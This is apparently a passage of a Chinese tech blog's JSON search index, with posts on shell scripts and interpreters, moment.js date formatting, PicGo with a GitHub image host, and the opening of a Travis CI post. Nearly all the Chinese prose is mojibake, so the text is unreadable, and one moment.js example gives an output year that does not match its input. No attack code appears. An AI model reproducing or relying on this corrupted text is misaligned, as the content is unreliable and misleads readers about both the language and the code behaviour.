·ä¸€ä¸ªé—®é¢˜ï¼šä¸ºä»€ä¹ˆè¿˜èƒ½ç”¨PHPå†™Shellè„šæœ¬ï¼Ÿ å½“æ—¶å°±å¾ˆä¸ç†è§£ã€‚è¿™é‡Œå°±ååº”äº†ä¸¤ä¸ªé—®é¢˜ï¼š å¯¹PHPçš„ç†è§£ä¸æ·± å¯¹Shellè„šæœ¬çš„ç†è§£ä¸æ·± ç†è®ºä¸Šè®²ï¼Œåªè¦ä¸€é—¨è¯­è¨€æä¾›äº†è§£é‡Šå™¨ï¼Œè¿™é—¨è¯­è¨€å°±å¯ä»¥èƒœä»»è„šæœ¬ç¼–ç¨‹ã€‚ æ‰€ä»¥ç”¨ PHP å¯ä»¥å†™ Shell è„šæœ¬ï¼Œå°±æ²¡æœ‰ä»€ä¹ˆå¥½å¥‡æ€ªçš„äº†ã€‚ä½ å¯èƒ½ä¼šé—®ï¼šè¿™å¥è¯é‡Œé¢çš„ Shellæ€ä¹ˆç†è§£ï¼Ÿ è¿˜è®°å¾—å—ï¼ŒShellçš„æ¦‚å¿µæ˜¯ä»€ä¹ˆï¼Ÿ Shell è„šæœ¬å°±æ˜¯å°†ä¸€å †çš„ Shell å‘½ä»¤ä»¥åŠæŒ‡å®šæ‰§è¡Œ Shell ï¼Œé€šè¿‡æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­æ¥æ‰§è¡Œã€‚ è„šæœ¬è¯­è¨€çš„åˆ†ç±»è„šæœ¬è¯­è¨€åˆå¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸¤å¤§ç±»ï¼š Shellè„šæœ¬ é€šç”¨åŠ¨æ€è¯­è¨€ å¸¸è§çš„Shellè„šæœ¬ï¼š sh bash csh ksh tcsh zsh AppleScript å¸¸è§çš„è„šæœ¬è¯­è¨€ JavaScript Perl PHP Python Ruby VBScript","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"Linux/å­¦ä¹ ç¬”è®°","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"å…³äºLinuxçš„Shellã€Shellè„šæœ¬ã€Shellç¯å¢ƒçš„ç†è§£","slug":"understanding-of-linux-shell-shell-script-shell-environment","date":"2020-07-08T13:40:01.000Z","updated":"2020-07-08T13:52:22.046Z","comments":true,"path":"understanding-of-linux-shell-shell-script-shell-environment/","link":"","permalink":"https://www.0x2beace.com/understanding-of-linux-shell-shell-script-shell-environment/","excerpt":"å¦‚æ ‡é¢˜æ‰€ç¤ºï¼Œè¿™ç‰‡ç¬”è®°ä¸»è¦ç›®çš„æ˜¯åŠ æ·±å¯¹Linuxçš„Shellã€Shellè„šæœ¬ã€Shellç¯å¢ƒçš„ç†è§£ã€‚","text":"å¦‚æ ‡é¢˜æ‰€ç¤ºï¼Œè¿™ç‰‡ç¬”è®°ä¸»è¦ç›®çš„æ˜¯åŠ æ·±å¯¹Linuxçš„Shellã€Shellè„šæœ¬ã€Shellç¯å¢ƒçš„ç†è§£ã€‚ ä»€ä¹ˆæ˜¯Shellï¼Ÿ åœ¨å›ç­”è¿™ä¸ªé—®é¢˜ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥è€ƒè™‘ä¸€ä¸ªé—®é¢˜ï¼šäººæ˜¯å¦‚ä½•è·Ÿè®¡ç®—æœºæ‰“äº¤é“çš„ï¼Ÿæˆ–è€…è¯´æ€æ ·è®©è®¡ç®—æœºæŒ‰ç…§æˆ‘ä»¬çš„è¦æ±‚å®ŒæˆæŸä¸ªä»»åŠ¡ï¼Ÿ ç°åœ¨å’Œè®¡ç®—æœºäº¤äº’çš„æ–¹å¼å¾ˆç®€å•ï¼Œç›´æ¥ç”¨å›¾å½¢ç•Œé¢çš„å·¥å…·å°±å¥½äº†ï¼Œæƒ³è¦è®¡ç®—æœºå®ŒæˆæŸä¸ªä»»åŠ¡ï¼Œé€šè¿‡æ“ä½œå›¾å½¢ç•Œé¢çš„å·¥å…·å°±èƒ½åˆ°è¾¾ç›®çš„ã€‚ é‚£ä¹ˆåœ¨ä»¥å‰å‘¢ï¼Ÿåœ¨é‚£ä¸ªè®¡ç®—æœºè¿˜æ²¡æœ‰è¿™ä¹ˆå…ˆè¿›çš„æ—¶ä»£å‘¢ï¼Ÿäººä»¬åˆæ˜¯å¦‚ä½•è®©è®¡ç®—å®ŒæˆæŸä¸ªä»»åŠ¡ã€‚é€šè¿‡â€œå‘½ä»¤â€çš„æ–¹å¼å‘Šè¯‰è®¡ç®—æœºæˆ‘éœ€è¦ä½ å¸®ä½ å®Œæˆè¿™ä»¶äº‹ã€‚è¿™ä¸ªâ€œå‘½ä»¤â€åˆæ˜¯æ€ä¹ˆå‘Šè¯‰è®¡ç®—æœºçš„å‘¢ï¼Ÿé€šè¿‡ä¸€ä¸ªäº¤äº’å·¥å…·ã€‚è¿™ä¸ªå·¥å…·å¯ä»¥å®ç°ä¸è®¡ç®—æœºä¹‹é—´çš„â€œä½ é—®æˆ‘ç­”ï¼Œä½ è¯´æˆ‘åšâ€çš„åŠŸèƒ½ã€‚ Shellå°±æ˜¯ä¸€ç§åº”ç”¨ç¨‹åºï¼ˆæ³¨æ„ï¼šæˆ‘è¿™é‡Œç”¨çš„æ˜¯ä¸€ç§ï¼‰ã€‚ è¿™ä¸ªåº”ç”¨ç¨‹åºæä¾›äº†ä¸€ä¸ªç•Œé¢ï¼ˆæ–¹ä¾¿æˆ‘ä»¬ä¸è®¡ç®—æœºè¿›è¡Œäº¤äº’ï¼‰ï¼Œç”¨æˆ·é€šè¿‡è¿™ä¸ªç•Œé¢è®¿é—®æ“ä½œç³»ç»Ÿå†…æ ¸çš„æœåŠ¡ã€‚ ä»€ä¹ˆæ˜¯Shellè„šæœ¬ï¼ŸShell è„šæœ¬ï¼ˆShell Scriptï¼‰ï¼Œæ˜¯ä¸€ç§ä¸º Shell ç¼–å†™çš„è„šæœ¬ç¨‹åºã€‚ Shell è„šæœ¬ç¼–ç¨‹æœ‰ä¸¤ç§æ–¹å¼ äº¤äº’å¼ï¼ˆInteractiveï¼‰ï¼šç”¨æˆ·æ¯è¾“å…¥ä¸€æ¡å‘½ä»¤å°±ç«‹å³æ‰§è¡Œã€‚ æ‰¹å¤„ç†ï¼ˆBatchï¼‰ï¼šç”±ç”¨æˆ·äº‹å…ˆç¼–å†™å¥½ä¸€ä¸ªå®Œæ•´çš„Shellè„šæœ¬ï¼ŒShellä¼šä¸€æ¬¡æ€§æ‰§è¡Œè„šæœ¬ä¸­è¯¸å¤šçš„å‘½ä»¤ã€‚ ä»€ä¹ˆæ˜¯Shellç¯å¢ƒShellç¼–ç¨‹è·Ÿjavaã€phpç¼–ç¨‹ä¸€æ ·ï¼Œåªè¦æœ‰ä¸€ä¸ªèƒ½ç¼–å†™ä»£ç çš„æ–‡æœ¬ç¼–è¾‘å™¨å’Œä¸€ä¸ªèƒ½è§£é‡Šæ‰§è¡Œçš„è„šæœ¬è§£é‡Šå™¨å°±å¯ä»¥äº†ã€‚ 0x01 Linux Linux é»˜è®¤å®‰è£…äº† Shell è§£é‡Šå™¨ã€‚ åœ¨Linuxä¸­ï¼Œä¸»æµçš„ Shell æ˜¯ Bashã€‚ åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œäººä»¬å¹¶ä¸åŒºåˆ† Bourne Shell å’Œ Bourne Again Shellï¼Œæ‰€ä»¥ï¼Œåƒ #!/bin/shï¼Œå®ƒåŒæ ·ä¹Ÿå¯ä»¥æ”¹ä¸º #!/bin/bashã€‚ 0x02 Mac OS Mac OSä¸ä»…å¸¦äº†shã€bashè¿™ä¸¤ä¸ªæœ€åŸºç¡€çš„è§£é‡Šå™¨ï¼Œè¿˜å†…ç½®äº†kshã€cshã€zshç­‰ä¸å¸¸ç”¨çš„è§£é‡Šå™¨ã€‚ 0x03 WindowsWindows å‡ºå‚æ—¶æ²¡æœ‰å†…ç½® Shell è§£é‡Šå™¨ï¼Œé€šå¸¸æˆ‘ä»¬éƒ½æ˜¯å®‰è£…cygwinæˆ–è€…mingw æ¨¡æ‹Ÿå™¨æ¥Linuxç¯å¢ƒã€‚ Cygwin Mingw å¦‚Gitçš„äº¤äº’ç•Œé¢å°±æ˜¯ç”±Mingwæ¨¡æ‹Ÿå™¨æä¾›çš„Bashã€‚ è„šæœ¬è§£é‡Šå™¨12345bash &#x3D;&gt; Bourne Again Shellï¼ˆ&#x2F;bin&#x2F;bashï¼‰sh &#x3D;&gt; Bourne Shellï¼ˆ&#x2F;usr&#x2F;bin&#x2F;shæˆ–&#x2F;bin&#x2F;shï¼‰csh &#x3D;&gt; C Shellï¼ˆ&#x2F;usr&#x2F;bin&#x2F;cshï¼‰ksh &#x3D;&gt; K Shellï¼ˆ&#x2F;usr&#x2F;bin&#x2F;kshï¼‰Shell for Rootï¼ˆ&#x2F;sbin&#x2F;shï¼‰ ç¬¬ä¸€ä¸ªShellè„šæœ¬æ‰“å¼€Bashæˆ–è€…ä»»ä½•ä¸€ä¸ªæ–‡æœ¬ç¼–è¾‘å™¨ï¼Œæ–°å»ºä¸€ä¸ªæ–‡ä»¶ Hello.shï¼Œæ‰©å±•åä¸ºsh(shä»£è¡¨shell)ã€‚ 123456#!&#x2F;bin&#x2F;bash#ç¬¬ä¸€ä¸ªShellè„šæœ¬#ä½œç”¨æ˜¯åˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶çš„è¯¦æƒ…ä¿¡æ¯PWDS&#x3D;echo &#96;pwd&#96;cd $PWDSls -l ä¸Šé¢è¿™ä¸ªè„šæœ¬ä¸­ï¼Œæœ‰ä¸‰ç§ä¸åŒçš„å…ƒç´ ï¼š ç¬¬ä¸€è¡Œçš„è„šæœ¬å£°æ˜ï¼ˆ#!ï¼‰ç”¨æ¥å‘Šè¯‰ç³»ç»Ÿä½¿ç”¨å“ªç§ Shell è§£é‡Šå™¨æ¥æ‰§è¡Œè¯¥è„šæœ¬ï¼› ç¬¬äºŒè¡Œçš„æ³¨é‡Šä¿¡æ¯ï¼ˆ#ï¼‰æ˜¯å¯¹è„šæœ¬åŠŸèƒ½å’ŒæŸäº›å‘½ä»¤çš„ä»‹ç»ä¿¡æ¯ï¼Œä½¿å¾—çœ‹åˆ°è„šæœ¬æ—¶èƒ½å¿«é€Ÿååº”æ˜¯åšä»€ä¹ˆçš„ã€‚ å‰©ä¸‹æ²¡æœ‰å‰ç¼€æ ‡è¯†çš„å°±æ˜¯ æ‰€è¦æ‰§è¡Œçš„è„šæœ¬å…·ä½“å‘½ä»¤äº†ã€‚ è¿è¡ŒShellè„šæœ¬æœ‰ä¸¤ç§æ–¹å¼ï¼š 1. ä½œä¸ºå¯æ‰§è¡Œç¨‹åº12$ chmod +x example.sh # ä½¿è„šæœ¬å…·æœ‰æ‰§è¡Œæƒé™$ .&#x2F;example.sh # æ‰§è¡Œè„šæœ¬ 2. ä½œä¸ºè§£é‡Šå™¨å‚æ•°è¿™ç§è¿è¡Œæ–¹å¼æ˜¯ï¼Œç›´æ¥è¿è¡Œè§£é‡Šå™¨ï¼Œå…¶å‚æ•°å°±æ˜¯shellè„šæœ¬çš„æ–‡ä»¶å: 1234# æ‰§è¡Œè„šæœ¬$ &#x2F;bin&#x2F;sh example.sh$ bash example.sh$ bash example.php ä½¿ç”¨è¿™ç§æ–¹å¼æ—¶ï¼Œå¯ä»¥ä¸ç”¨åœ¨è„šæœ¬ç¬¬ä¸€è¡Œå£°æ˜è§£é‡Šå™¨ä¿¡æ¯ã€‚ 12345678$ cat example.php#è¿™æ˜¯ä¸€ä¸ªç”¨phpå†™çš„Shellè„šæœ¬ï¼Œæœ‰ä¸¤ä¸ªä½œç”¨#1.ç¡®è®¤æ˜¯å¦ç”¨è§£é‡Šå™¨å‚æ•°æ‰§è¡Œshellè„šæœ¬å¯ä»¥ä¸ç”¨å†™å£°æ˜#2.ç¡®è®¤å¦‚ä½•ç”¨phpå†™shellè„šæœ¬string&#x3D;&quot;php shell&quot;echo $string$ bash example.phpphp shell","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"Linux/å­¦ä¹ ç¬”è®°","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"moment.js ç”¨æ³•æ€»ç»“","slug":"moment-js-usage-summary","date":"2020-07-07T10:59:32.000Z","updated":"2020-07-08T16:31:53.649Z","comments":true,"path":"moment-js-usage-summary/","link":"","permalink":"https://www.0x2beace.com/moment-js-usage-summary/","excerpt":"æœ€è¿‘åœ¨åšçš„ä¸€ä¸ªå‰ç«¯é¡¹ç›®ï¼Œç»å¸¸ä¼šé‡åˆ°å¯¹æ—¶é—´çš„å¤„ç†ï¼Œå› ä¸ºåŸç”Ÿçš„æ—¶é—´æ ¼å¼å¤„ç†èµ·æ¥å¾ˆè´¹åŠ²ï¼Œæ‰€ä»¥å¼•å…¥äº†ä¸€ä¸ªè½»é‡çº§çš„æ—¥æœŸå¤„ç†ç±»åº“ã€‚ momentjs æ”¯æŒæ—¥æœŸæ ¼å¼åŒ–ã€Dateã€æ—¶é—´æˆ³ç­‰ç›¸äº’è½¬æ¢ï¼Œå®ƒä½¿å¾—æ“ä½œæ—¶é—´å˜å¾—éå¸¸ç®€å•ã€‚","text":"æœ€è¿‘åœ¨åšçš„ä¸€ä¸ªå‰ç«¯é¡¹ç›®ï¼Œç»å¸¸ä¼šé‡åˆ°å¯¹æ—¶é—´çš„å¤„ç†ï¼Œå› ä¸ºåŸç”Ÿçš„æ—¶é—´æ ¼å¼å¤„ç†èµ·æ¥å¾ˆè´¹åŠ²ï¼Œæ‰€ä»¥å¼•å…¥äº†ä¸€ä¸ªè½»é‡çº§çš„æ—¥æœŸå¤„ç†ç±»åº“ã€‚ momentjs æ”¯æŒæ—¥æœŸæ ¼å¼åŒ–ã€Dateã€æ—¶é—´æˆ³ç­‰ç›¸äº’è½¬æ¢ï¼Œå®ƒä½¿å¾—æ“ä½œæ—¶é—´å˜å¾—éå¸¸ç®€å•ã€‚ å¿«é€Ÿä¸Šæ‰‹momentjsæ”¯æŒå¤šä¸ªç¯å¢ƒï¼Œæ‰€æœ‰çš„ä»£ç éƒ½åº”è¯¥åœ¨è¿™ä¸¤ç§ç¯å¢ƒä¸­éƒ½å¯ä»¥å·¥ä½œã€‚ Node.js12npm install momentvar moment &#x3D; require(&#39;moment&#39;); æµè§ˆå™¨1&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;moment.js&#x2F;2.9.0&#x2F;moment.js&quot;&gt;&lt;&#x2F;script&gt; å®ä¾‹è·å–å½“å‰çš„æ—¥æœŸå’Œæ—¶é—´ï¼š åˆ›å»º1moment(); ç›¸å½“äºmoment(new Date()) æ­¤å¤„ä¼šè¿”å›ä¸€ä¸ªmomentå°è£…çš„æ—¥æœŸå¯¹è±¡ã€‚ æ ¼å¼åŒ–1234567moment().format(&#39;YYYYå¹´MMæœˆDDæ—¥ HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020å¹´07æœˆ07æ—¥ 07:49:38&quot;moment().format(&#39;YYYY-MM-DD HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020-07-07 07:50:57&quot;moment().format(&#39;YYYY&#x2F;MM&#x2F;DD HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020&#x2F;07&#x2F;07 07:51:17&quot;moment().format(&#39;hh:m:ss&#39;) &#x2F;&#x2F; &quot;07:51:34&quot;moment().format(&#39;YYYY&#39;) &#x2F;&#x2F; &quot;2020&quot;moment().format(&#39;d&#39;) &#x2F;&#x2F; 2ï¼Œä»Šå¤©æ˜¯å‘¨äºŒmoment().format(&#39;X&#39;) &#x2F;&#x2F; è·å–å½“å‰æ—¶é—´çš„Unixæ—¶é—´æˆ³ è½¬æ¢ä¸ºDateå¯¹è±¡1234moment().toDate() &#x2F;&#x2F; Mon Jan 22 2018 18:11:55 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´)moment(&#39;2018-01-20&#39;).toDate() &#x2F;&#x2F; Tue Jan 20 2015 00:00:00 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´)moment(&#39;2018-01-22 10:20:15&#39;).toDate() &#x2F;&#x2F; Mon Jan 22 2018 10:20:15 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´)moment(1448896064621).toDate() &#x2F;&#x2F;æ¯«ç§’è½¬æ—¥æœŸ è·å–æ—¶é—´ä¿¡æ¯123456789moment().second() &#x2F;&#x2F; è·å–å½“å‰è¿™ä¸€åˆ†é’Ÿçš„å¤šå°‘ç§’moment().date() &#x2F;&#x2F; è·å–å¤©moment().day() &#x2F;&#x2F; è·å–æ˜ŸæœŸmoment().dayOfYear() &#x2F;&#x2F; ä¸€å¹´å†…çš„å¤šå°‘å¤©moment().week() &#x2F;&#x2F; ä¸€å¹´é‡Œçš„å¤šå°‘å‘¨moment().month() &#x2F;&#x2F; è·å–å½“å‰æœˆä»½ï¼ˆå®é™…æœˆä»½-1ï¼‰moment().quarter() &#x2F;&#x2F; ä¸€å¹´å†…çš„ç¬¬å‡ ä¸ªå­£åº¦moment().year() &#x2F;&#x2F; è·å–å¹´ä»½moment().daysInMonth() &#x2F;&#x2F; è·å–å½“æœˆå¤©æ•° æ˜¾ç¤ºä¸€æ—¦è§£æå’Œæ“ä½œå®Œæˆåï¼Œéœ€è¦æŸäº›æ–¹å¼æ¥æ˜¾ç¤º momentã€‚ ä½¿ç”¨formatæ¥æ ¼å¼åŒ–æ—¥æœŸï¼š 123456moment().format() &#x2F;&#x2F; &quot;2020-07-07T08:24:35+08:00&quot;moment.unix(timestamp).format(&#39;YYYY-MM-DD HH:mm:ss&#39;); &#x2F;&#x2F; å°†Unix æ—¶é—´æˆ³è½¬æ¢ä¸ºæ—¥æœŸæ ¼å¼moment(timestamp).format(&#39;YYYY-MM-DD HH:mm:ss&#39;); &#x2F;&#x2F; å°†Unix æ¯«ç§’æ—¶é—´æˆ³è½¬æ¢ä¸ºæ—¥æœŸæ ¼å¼moment().unix(); &#x2F;&#x2F; è·å–Unix æ—¶é—´æˆ³moment().format(&quot;X&quot;); &#x2F;&#x2F; è·å–Unix æ—¶é—´æˆ³moment().format(&quot;x&quot;); &#x2F;&#x2F; è·å–Unix æ¯«ç§’æ—¶é—´æˆ³","categories":[{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://www.0x2beace.com/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://www.0x2beace.com/tags/JavaScript/"}]},{"title":"å¦‚ä½•é€‰æ‹©ä¸€ä¸ªé€‚åˆè‡ªå·±çš„å›¾åºŠ","slug":"how-to-choose-a-picture-bed-that-suits-you","date":"2020-07-06T15:06:33.000Z","updated":"2020-07-10T05:36:37.965Z","comments":true,"path":"how-to-choose-a-picture-bed-that-suits-you/","link":"","permalink":"https://www.0x2beace.com/how-to-choose-a-picture-bed-that-suits-you/","excerpt":"å› ä¸ºæ²¡æœ‰æŠŠåšå®¢éƒ¨ç½²åœ¨æœåŠ¡å™¨ä¸Šï¼Œè€Œæ˜¯é€‰æ‹©GitHub Pages çš„æ–¹å¼ï¼Œæ‰€ä»¥å¦‚æœé‡åˆ°éœ€è¦æ’å…¥å›¾ç‰‡çš„æ—¶å€™ï¼Œåªèƒ½é€šè¿‡å›¾åºŠæ¥å­˜å‚¨å›¾ç‰‡ã€‚ å¦‚æœä¸æ˜¯å› ä¸ºSM.MS å›¾åºŠåœ¨ä»Šå¤©çªç„¶æŒ‚æ‰äº†ï¼Œæˆ‘å¯èƒ½éƒ½ä¸ä¼šå»æƒ³æ˜¯å¦éœ€è¦æ›´æ¢å›¾åºŠè¿™ä¸ªé—®é¢˜ã€‚ äºæ˜¯æˆ‘å¼€å§‹å¯»æ‰¾ä¸€ä¸ªå…è´¹ã€ç¨³å®šçš„å›¾åºŠï¼Œæœ€ååœ¨ä¼—å¤šå›¾åºŠä¸­ï¼Œæœ€åé€‰æ‹©äº†GitHub å›¾åºŠã€‚ ä½¿ç”¨GitHub å›¾åºŠï¼Œå¯èƒ½å”¯ä¸€çš„é—®é¢˜æ˜¯éœ€è¦è‡ªå¤‡å¥½ç§‘å­¦ä¸Šç½‘å·¥å…·ï¼Œå¦åˆ™å›¾ç‰‡æ— æ³•åŠ è½½ã€‚","text":"å› ä¸ºæ²¡æœ‰æŠŠåšå®¢éƒ¨ç½²åœ¨æœåŠ¡å™¨ä¸Šï¼Œè€Œæ˜¯é€‰æ‹©GitHub Pages çš„æ–¹å¼ï¼Œæ‰€ä»¥å¦‚æœé‡åˆ°éœ€è¦æ’å…¥å›¾ç‰‡çš„æ—¶å€™ï¼Œåªèƒ½é€šè¿‡å›¾åºŠæ¥å­˜å‚¨å›¾ç‰‡ã€‚ å¦‚æœä¸æ˜¯å› ä¸ºSM.MS å›¾åºŠåœ¨ä»Šå¤©çªç„¶æŒ‚æ‰äº†ï¼Œæˆ‘å¯èƒ½éƒ½ä¸ä¼šå»æƒ³æ˜¯å¦éœ€è¦æ›´æ¢å›¾åºŠè¿™ä¸ªé—®é¢˜ã€‚ äºæ˜¯æˆ‘å¼€å§‹å¯»æ‰¾ä¸€ä¸ªå…è´¹ã€ç¨³å®šçš„å›¾åºŠï¼Œæœ€ååœ¨ä¼—å¤šå›¾åºŠä¸­ï¼Œæœ€åé€‰æ‹©äº†GitHub å›¾åºŠã€‚ ä½¿ç”¨GitHub å›¾åºŠï¼Œå¯èƒ½å”¯ä¸€çš„é—®é¢˜æ˜¯éœ€è¦è‡ªå¤‡å¥½ç§‘å­¦ä¸Šç½‘å·¥å…·ï¼Œå¦åˆ™å›¾ç‰‡æ— æ³•åŠ è½½ã€‚ ä¸ºä»€ä¹ˆä¸é€‰æ‹©å›½å†…çš„é‚£äº›å›¾åºŠæœåŠ¡ï¼Ÿ æˆ‘åªæ˜¯æƒ³å­˜ä¸€äº›å›¾ç‰‡ï¼Œè€Œå›½å†…çš„å¤§éƒ¨åˆ†å›¾åºŠæœåŠ¡ï¼Œè¿˜éœ€è¦åšåŸŸåå¤‡æ¡ˆä»¥åŠç»‘å®šå„ç§æœåŠ¡ï¼Œæ„Ÿè§‰å¾ˆç¹çï¼ŒåŠ ä¸Šæˆ‘çš„åŸŸåä¸æ˜¯åœ¨å›½å†…çš„åŸŸåæœåŠ¡å•†é‚£é‡Œä¹°çš„ï¼Œç´¢æ€§å°±æ²¡æœ‰è€ƒè™‘å›½å†…çš„å›¾åºŠæœåŠ¡ã€‚ å›¾åºŠç®¡ç†å·¥å…·æœ‰äº†å›¾åºŠï¼Œå°±éœ€è¦é¡ºæ‰‹é…ç½®ä¸€ä¸ªå›¾åºŠç®¡ç†å·¥å…·ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©çš„æ˜¯ PicGoï¼Œä»…ç›®å‰æ”¯æŒçš„å›¾åºŠå°±æœ‰ï¼šSM.MSå›¾åºŠï¼Œå¾®åšå›¾åºŠï¼Œä¸ƒç‰›å›¾åºŠï¼Œè…¾è®¯äº‘COSï¼Œé˜¿é‡Œäº‘OSSï¼ŒImgurï¼Œåˆæ‹äº‘ï¼ŒGitHub å›¾åºŠç­‰ã€‚ åˆ›å»ºGitHub å›¾åºŠé¦–å…ˆï¼Œä½ å¾—æœ‰ä¸€ä¸ªGitHub è´¦å·ã€‚ 1. æ–°å»ºä¸€ä¸ªä»“åº“è¿™ä¸ªä»“åº“æ˜¯ç”¨äºå­˜å‚¨å›¾ç‰‡ï¼Œæœ€å¥½æ˜¯publicï¼Œå› ä¸ºprivateçš„ä»“åº“ï¼Œå›¾ç‰‡é“¾æ¥ä¼šå¸¦tokenï¼Œè€Œè¿™ä¸ªtokenä¼šå­˜åœ¨è¿‡æœŸçš„é—®é¢˜ã€‚ 2. è·å–æˆæƒtokené€šè¿‡Settings-&gt;Developer settings-&gt;Personal access tokens åˆ›å»ºä¸€ä¸ªæ–°çš„token ç”¨äºPicGoæ“ä½œä½ çš„ä»“åº“ã€‚ æŠŠrepoçš„å‹¾æ‰“ä¸Šå³å¯ï¼Œç‚¹å‡»Generate tokençš„ç»¿è‰²æŒ‰é’®ç”Ÿæˆ tokenã€‚ åˆ›å»ºæˆåŠŸåï¼Œä¼šç”Ÿæˆä¸€ä¸²tokenï¼Œè¿™ä¸²tokenä¹‹åä¸ä¼šå†æ˜¾ç¤ºï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡çœ‹åˆ°çš„æ—¶å€™æœ€å¥½ä¿å­˜å¥½ã€‚ é…ç½®PicGoGitHub å›¾åºŠçš„é…ç½®è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œä¸‹é¢æ˜¯å‚æ•°è¯´æ˜ã€‚ ä»“åº“åï¼šä½ çš„å›¾åºŠä»“åº“çš„åç§°ï¼Œæ ¼å¼ä¸ºï¼šusername/repository åˆ†æ”¯åï¼šä¸€èˆ¬é€‰æ‹©é»˜è®¤åˆ†æ”¯ master Tokenï¼šåˆšæ‰ç”Ÿæˆçš„ Token å­˜å‚¨è·¯å¾„ï¼šæŒ‡å®šå­˜æ”¾åœ¨ä»“åº“çš„å“ªä¸ªç›®å½•ä¸‹ è‡ªå®šä¹‰åŸŸåï¼šraw.githubusercontent.com/username/repository/branch è‡ªå®šä¹‰åŸŸåæœ€å¥½æŒ‰ç…§ä¸€å®šçš„è§„åˆ™å»å®šä¹‰ï¼šraw.githubusercontent.com+ä½ çš„githubç”¨æˆ·å+ä»“åº“åç§°+åˆ†æ”¯åç§° raw.githubusercontent.com æ˜¯githubç”¨æ¥å­˜å‚¨ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„æœåŠ¡åœ°å€ï¼Œæ˜¯github çš„ç´ ææœåŠ¡å™¨ (assets server)ã€‚ é€šå¸¸é…ç½®å®Œæˆä¹‹åï¼Œå°±å¯ä»¥ç›´æ¥ä½¿ç”¨äº†ã€‚ å¦‚æœä½ ä¸Šä¼ å¤±è´¥çš„æƒ…å†µï¼Œå¯ä»¥æ‰“å¼€PicGo çš„æ—¥å¿—çœ‹çœ‹å…·ä½“æ˜¯ä»€ä¹ˆå¼‚å¸¸ å¦‚æœå¾—åˆ°äº†è¿™æ ·çš„å¼‚å¸¸ï¼Œé‚£ä¹ˆå¤§æ¦‚ç‡æ˜¯å› ä¸ºä½ æ²¡æœ‰å¼€å¯å…¨å±€ä»£ç†ã€‚ 1[PicGo ERROR] RequestError: Error: connect ECONNREFUSED 13.250.168.23:443&#96; å› ä¸ºGitHub æœåŠ¡å™¨å’Œå›½å†… GFW çš„é—®é¢˜ä¼šå¯¼è‡´æœ‰æ—¶ä¸Šä¼ æˆåŠŸï¼Œæœ‰æ—¶ä¸Šä¼ å¤±è´¥ï¼Œæ‰€ä»¥éœ€è¦è‡ªå¤‡å¥½ç§‘å­¦ä¸Šç½‘å·¥å…·ã€‚ å¦‚æœä½ è¿˜æœ‰å…¶ä»–é—®é¢˜ï¼Œå¯ä»¥æŸ¥é˜… PicGo FAQã€‚ æ€»ç»“ å¦‚æœä½ å’Œæˆ‘ä¸€æ ·ï¼Œè®¨åŒåŸŸåå¤‡æ¡ˆï¼Œåˆå¸Œæœ›èƒ½æœ‰ä¸€ä¸ªå…è´¹ã€ç¨³å®šçš„å›¾åºŠï¼Œé‚£ä¹ˆä¸€å®šä¸è¦é”™è¿‡GitHub å›¾åºŠã€‚ å¦‚æœä½ åªæ˜¯éœ€è¦å­˜å‚¨ä¸€äº›ä¸æ€ä¹ˆé‡è¦çš„å›¾ç‰‡ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨å…è´¹ä¸é™å¤§å°çš„SM.MSå›¾åºŠã€‚ å¦‚æœæ‰“ç®—é•¿æœŸç¨³å®šä½¿ç”¨å¯ä»¥ä¼˜å…ˆé€‰æ‹©åˆæ‹äº‘æˆ–è€…ä¸ƒç‰›äº‘ã€‚","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"Skill","slug":"Tutorial/Skill","permalink":"https://www.0x2beace.com/categories/Tutorial/Skill/"},{"name":"GitHub","slug":"Tutorial/Skill/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/Skill/GitHub/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"}]},{"title":"Travis CI å¿«é€Ÿä¸Šæ‰‹","slug":"travis-ci-quick-start","date":"2020-07-05T06:25:58.000Z","updated":"2020-07-09T13:12:54.040Z","comments":true,"path":"travis-ci-quick-start/","link":"","permalink":"https://www.0x2beace.com/travis-ci-quick-start/","excerpt":"æœ€è¿‘ä½¿ç”¨Github Pages æ­å»ºHexo 